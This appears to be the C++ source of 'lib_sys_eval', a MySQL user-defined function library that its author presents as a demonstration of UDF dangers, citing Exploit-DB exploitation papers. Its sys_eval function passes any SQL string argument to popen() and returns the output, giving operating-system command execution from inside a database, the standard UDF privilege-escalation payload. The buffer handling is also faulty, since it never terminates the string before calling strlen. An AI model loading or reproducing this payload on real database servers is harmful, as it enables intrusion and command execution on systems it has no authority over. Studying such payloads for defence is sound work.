/*
  lib_sys_eval - a lirbary used to demonstrate the dangers of allowing UDF functions within MySQL,
  Author: David Busby <oneiroi@fedoraproject.org>
  License: Apache 2 & GNU 3.0
  References used:
   udf_example.cc from MySQL 8.x source code: https://github.com/mysql/mysql-server/blob/8.0/sql/udf_example.cc
   Original lib_mysqldf_sys from which sys_eval is adapted: https://github.com/mysqludf/lib_mysqludf_sys
   Exploitdb MySQL UDF Exploitation paper - https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf
   ExploitDB Mysql 4/5/6 - UDF For Command Execution https://www.exploit-db.com/exploits/7856
   sys_bineval - write up here: https://osandamalith.com/2018/02/11/mysql-udf-exploitation/ 
*/
#include <assert.h>
#include <ctype.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <algorithm>
#include <mutex>
#include <new>
#include <regex>
#include <string>
#include <vector>

#include <time.h>

#include "mysql.h"  // IWYU pragma: keep

/* START udf_exmaple.cc functions */ 
/* Commented out, was used to debug symbols in final .so taken from udf_example.cc

#define MAXMETAPH 8

extern "C" bool metaphon_init(UDF_INIT *initid, UDF_ARGS *args, char *message) {
  if (args->arg_count != 1 || args->arg_type[0] != STRING_RESULT) {
    strcpy(message, "Wrong arguments to metaphon;  Use the source");
    return true;
  }
  initid->max_length = MAXMETAPH;
  return false;
}

extern "C" void metaphon_deinit(UDF_INIT *) {}

extern "C" char *metaphon(UDF_INIT *, UDF_ARGS *args, char *result,
                          unsigned long *length, unsigned char *is_null,
                          unsigned char *) {
                            return result; //dummy function used to ensure symbols being loaded in only, stipped main example function entirely
                           }
                           */
/* END udf_exmaple.cc functions */ 
// Why the above ^ failing to get sys_eval symbols into .so this allows _something_ known to be valid to be used for comparrison and debugging.

extern "C" bool sys_eval_init(UDF_INIT *initid,UDF_ARGS *args, char *message) {
    unsigned int i=0;
	if(args->arg_count == 1
	&& args->arg_type[i]==STRING_RESULT){
		return 0; //think less boolean and instead "bash" return codes, 0 for OK 1 for something wrong
	} else {
		strcpy(
			message
		,	"Expected exactly one string type parameter"
		);		
		return 1;
	}
}

extern "C" void sys_eval_deinit(UDF_INIT *) {}

extern "C" char* sys_eval(UDF_INIT *, UDF_ARGS *args, char *result, unsigned long *length, char *is_null, char *error){
    FILE *pipe;
	char line[1024];
    //int i;
	unsigned long outlen, linelen;
    //char* hex;
    //typedef basic_string cmd;
    
    result = (char*)malloc(1);
	outlen = 0;

    //cmd  = cmd.append(args->args[0])
    pipe = popen(args->args[0], "r");
    
    while (fgets(line, sizeof(line), pipe) != NULL) {
		linelen = strlen(line);
		result = (char*)realloc(result, outlen + linelen);
		strncpy(result + outlen, line, linelen);
		outlen = outlen + linelen;
	}

	pclose(pipe);
    if (!(*result) || result == NULL) {
		*is_null = 1;
	} else {
        //command executed, and we have returned output
        //result is a hex char string, prefixed 0x
        //buff = (int)result[linelen];
        // le sigh .. why or why can this not be converted?! the output is still hex!
        //sscanf(result, "%02x", &buff);
		*length = strlen(result);
	}
	return result;
}


